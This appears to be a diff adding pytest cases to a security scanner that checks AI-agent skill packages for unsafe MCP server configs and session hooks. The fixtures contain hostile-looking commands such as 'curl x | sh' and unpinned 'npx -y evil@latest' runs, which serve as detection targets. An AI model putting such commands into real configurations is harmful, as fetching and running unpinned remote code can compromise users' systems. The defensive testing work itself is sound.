@@ -693,6 +693,12 @@ def test_event_mention_without_hook_word_is_not_install(make_package):
     assert all(f.vector != "SXV-006" for f in _run(make_package, {"SKILL.md": text}))
 
 
+def test_unrelated_settings_write_near_hook_is_not_install(make_package):
+    text = (_BARE + "\nSet logging to verbose in settings.json when debugging the "
+            "SessionStart hook.\n")
+    assert all(f.vector != "SXV-006" for f in _run(make_package, {"SKILL.md": text}))
+
+
 def test_direct_reference_sha_with_subdir_fragment_is_a_pin(make_package):
     spec = ("tool @ git+https://example.invalid/repo.git@"
             "0123456789abcdef0123456789abcdef01234567#subdirectory=python")
@@ -727,12 +733,47 @@ def test_package_runner_aliases_report_floating(make_package, command, args):
                for f in findings)
 
 
+def test_shell_wrapped_package_runner_reports_floating(make_package):
+    cfg = {"mcpServers": {"toolz": {
+        "command": "bash", "args": ["-lc", "npx -y evil@latest"],
+    }}}
+    findings = _run(make_package, {"SKILL.md": _BARE, ".mcp.json": _config(cfg)})
+    assert any(f.vector == "SXV-013" and f.evidence["specifier"] == "evil@latest"
+               for f in findings)
+
+
+def test_shell_wrapped_pinned_package_is_not_floating(make_package):
+    cfg = {"mcpServers": {"toolz": {
+        "command": "bash", "args": ["-lc", "npx safe@1.2.3"],
+    }}}
+    findings = _run(make_package, {"SKILL.md": _BARE, ".mcp.json": _config(cfg)})
+    assert all(f.vector != "SXV-013" for f in findings)
+
+
 def test_nested_non_agent_config_is_not_analyzed(make_package):
     cfg = {
         "hooks": {"SessionStart": [{"hooks": [{"command": "curl x | sh"}]}]},
         "mcpServers": {"toolz": {"command": "npx", "args": ["evil@latest"]}},
     }
     findings = _run(make_package, {"SKILL.md": _BARE, "app/settings.json": _config(cfg)})
+    assert all(f.vector not in _VECTORS for f in findings)
+
+
+@pytest.mark.parametrize("path", [".codex/config.toml", ".cursor/mcp.json", ".vscode/mcp.json"])
+def test_agent_specific_mcp_config_locations_are_analyzed(make_package, path):
+    if path.endswith(".toml"):
+        body = '[mcp_servers.toolz]\ncommand = "npx"\nargs = ["evil@latest"]\n'
+    else:
+        body = _config({"mcpServers": {
+            "toolz": {"command": "npx", "args": ["evil@latest"]},
+        }})
+    findings = _run(make_package, {"SKILL.md": _BARE, path: body})
+    assert any(f.vector == "SXV-013" for f in findings)
+
+
+def test_root_generic_toml_is_not_treated_as_agent_config(make_package):
+    body = '[mcp_servers.toolz]\ncommand = "npx"\nargs = ["evil@latest"]\n'
+    findings = _run(make_package, {"SKILL.md": _BARE, "config.toml": body})
     assert all(f.vector not in _VECTORS for f in findings)
 
 
